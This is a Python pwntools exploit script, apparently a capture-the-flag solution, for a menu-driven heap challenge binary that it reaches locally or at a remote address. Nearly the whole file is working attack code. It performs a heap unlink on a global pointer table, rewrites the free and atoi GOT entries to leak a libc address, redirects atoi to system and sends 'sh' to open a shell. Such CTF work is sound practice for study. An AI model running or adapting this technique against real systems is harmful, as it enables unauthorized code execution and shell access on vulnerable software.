#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('111.198.29.45', 49303)
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('$', str(index))

def create(index, size, content):
    menu(1)
    p.sla('Input size', str(size))
    p.sla('Input cun', str(index))
    p.sa('Input content', content)

def delete(index):
    menu(2)
    p.sla('Chose one to dele\n', str(index))

def edit(index, content):
    menu(3)
    p.sla('Chose one to edit', str(index))
    p.sa('Input the content', content)

if __name__ == '__main__':
    p.sla('$', 'qaq')
    target_addr = 0x00000000006020E0 + 0x10
    create(0, 0x40, 'a')
    create(1, 0x28, 'a')
    create(2, 0x88, 'b')
    delete(1)
    create(3, 0x1000, 'a')
    delete(1)
    create(1, 0x28, flat([0x0, 0x21, target_addr - 0x18, target_addr - 0x10, 0x20]))
    delete(2)
    edit(1, flat([0x0, elf.got['free']]))
    edit(0, p64(elf.plt['puts']))
    edit(1, flat([0x0, elf.got['atoi']]))
    delete(0)
    atoi_addr = u64(p.r(6).ljust(8, '\x00'))
    success('atoi ' + hex(atoi_addr))
    system_addr = atoi_addr + 0xe510
    edit(1, flat([0x0, elf.got['atoi'], 0x1]))
    edit(0, p64(system_addr))
    menu('sh')

    p.i()
